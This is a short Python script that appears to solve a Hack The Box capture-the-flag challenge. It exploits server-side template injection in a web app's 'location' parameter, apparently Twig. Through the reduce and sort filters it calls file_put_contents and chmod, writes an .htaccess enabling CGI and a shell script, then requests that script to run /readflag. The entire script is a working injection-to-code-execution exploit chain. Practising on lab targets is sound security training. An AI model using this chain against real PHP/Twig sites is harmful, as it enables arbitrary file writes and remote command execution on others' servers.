#!/usr/bin/env python3
import re
import sys
from urllib.parse import urlencode
from urllib.request import urlopen


base_url = (sys.argv[1] if len(sys.argv) > 1 else "http://154.57.164.78:30429").rstrip("/")


def inject(template: str) -> None:
    urlopen(f"{base_url}/?{urlencode({'location': template})}", timeout=15).read()


inject('{{["Options +ExecCGI\\nAddHandler cgi-script .sh\\n"]'
       '|reduce("file_put_contents","/www/public/.htaccess")}}')
inject('{{["#!/bin/sh\\nprintf \'Content-Type: text/plain\\r\\n\\r\\n\'\\n/readflag\\n"]'
       '|reduce("file_put_contents","/www/public/run.sh")}}')

# reduce() passes an extra key to its callback, which chmod() rejects. sort()
# calls its comparator with exactly two arguments, yielding chmod(path, 0755).
inject('{{["/www/public/run.sh",493]|sort("chmod")|join(",")}}')

result = urlopen(f"{base_url}/run.sh", timeout=15).read().decode()
flag = re.search(r"HTB\{[^}]+\}", result)
if not flag:
    raise SystemExit(f"flag not found in response: {result!r}")
print(flag.group(0))
